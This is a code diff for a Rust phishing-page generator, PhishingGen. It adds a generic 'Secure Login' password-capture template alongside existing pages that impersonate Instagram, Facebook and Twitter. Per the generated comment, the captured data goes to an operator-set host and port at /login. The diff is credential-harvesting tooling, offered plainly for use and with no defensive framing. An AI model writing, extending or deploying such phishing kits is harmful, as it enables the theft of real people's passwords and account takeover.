@@ -22,6 +22,7 @@ impl PhishingGen {
         let _ = fs::create_dir_all(out_dir);
 
         let pages = match template.to_lowercase().as_str() {
+            "login" => self.login_page(lhost, lport),
             "instagram" => self.instagram_page(lhost, lport),
             "facebook" => self.facebook_page(lhost, lport),
             "twitter" => self.twitter_page(lhost, lport),
@@ -836,5 +837,12 @@ input {{ background: #330000; color: #ff0000; border: 1px solid #ff0000; padding
         ]);
         let foot = self.social_foot();
         format!("{head}{form}{foot}<!-- Meeting -->\n<!-- Data to {lhost}:{lport}/meeting -->", head = head, form = form, foot = foot, lhost = lhost, lport = lport)
+    }
+
+    fn login_page(&self, lhost: &str, lport: &str) -> String {
+        let head = self.social_head("🔒 Secure Login");
+        let form = self.social_form_password("Password", "password");
+        let foot = self.social_foot();
+        format!("{head}{form}{foot}<!-- Login -->\n<!-- Data to {lhost}:{lport}/login -->", head = head, form = form, foot = foot, lhost = lhost, lport = lport)
     }
 }
